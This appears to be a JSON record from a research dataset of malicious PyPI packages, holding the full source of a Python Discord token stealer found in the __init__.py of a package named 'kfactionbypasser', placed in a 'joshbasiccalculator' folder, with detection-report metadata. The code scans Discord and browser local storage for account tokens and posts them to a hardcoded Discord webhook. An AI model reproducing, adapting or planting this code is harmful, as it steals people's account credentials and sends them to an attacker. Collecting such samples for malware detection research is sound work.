[
  {
    "pyfile": "__init__.py",
    "malicious_code_snippets": "import os\nimport re\nimport json\nfrom urllib.request import Request, urlopen\n\n# your webhook URL\nWEBHOOK_URL = 'https://discord.com/api/webhooks/1071628794491834449/Y29rga-lOVZ1NGdaC4UumNwV9jR34FFwJe4jMoi79hNwJMKJeBz8vSKAyecskkZK1kba'\n\nPING_ME = False\n\ndef find_tokens(path):\n    path += '\\\\Local Storage\\\\leveldb'\n\n    tokens = []\n\n    for file_name in os.listdir(path):\n        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):\n            continue\n\n        for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n            for regex in (r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', r'mfa\\.[\\w-]{84}'):\n                for token in re.findall(regex, line):\n                    tokens.append(token)\n    return tokens\n\ndef main():\n    local = os.getenv('LOCALAPPDATA')\n    roaming = os.getenv('APPDATA')\n\n    paths = {\n        'Discord': roaming + '\\\\Discord',\n        'Discord Canary': roaming + '\\\\discordcanary',\n        'Discord PTB': roaming + '\\\\discordptb',\n        'Google Chrome': local + '\\\\Google\\\\Chrome\\\\User Data\\\\Default',\n        'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',\n        'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',\n        'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default'\n    }\n\n    message = '@everyone' if PING_ME else ''\n\n    for platform, path in paths.items():\n        if not os.path.exists(path):\n            continue\n\n        message += f'\\n**{platform}**\\n```\\n'\n\n        tokens = find_tokens(path)\n\n        if len(tokens) > 0:\n            for token in tokens:\n                message += f'{token}\\n'\n        else:\n            message += 'No tokens found.\\n'\n\n        message += '```'\n\n    headers = {\n        'Content-Type': 'application/json',\n        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'\n    }\n\n    payload = json.dumps({'content': message})\n\n    try:\n        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)\n        urlopen(req)\n    except:\n        pass\n\nif __name__ == '__main__':\n    main()",
    "hash_value": "e35dcfa9a449c92b3c1327ad7563ab2a"
  },
  {
    "metadata": {
      "package_name": "kfactionbypasser-0.0.1",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/kfactionbypasser-0.0.1.txt",
      "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/kfactionbypasser-0.0.1/kfactionbypasser-0.0.1/joshbasiccalculator/__init__.py",
      "code_hash": "e35dcfa9a449c92b3c1327ad7563ab2a"
    }
  }
]